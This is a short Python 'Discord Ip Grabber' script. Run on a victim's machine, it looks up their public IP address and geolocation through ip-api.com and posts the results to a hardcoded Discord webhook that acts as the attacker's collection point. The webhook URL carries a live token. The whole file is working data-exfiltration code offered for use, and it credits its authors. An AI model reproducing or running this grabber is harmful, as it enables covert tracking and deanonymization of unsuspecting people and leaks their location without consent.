import requests, json

webhook = 'https://discord.com/api/webhooks/1342300592285941862/tDAjsQ3qEER7Lalst2uF0ln0E3fGtxpPrMHB-CvvyEnhnZ6N2KoRDNcF8-kxf3lGMcxa'

msg = "```New Ip Are Grabbed\n\n"
for item, data in (requests.get('http://ip-api.com/json/')).json().items():
    msg += f"{item}: {data}\n"

msg += "\nIp Grabber By github.com/XinOnGithub + github.com/Monst3red```"
requests.post(webhook, data={"content":f'{msg}',"username":"Discord Ip Grabber"})
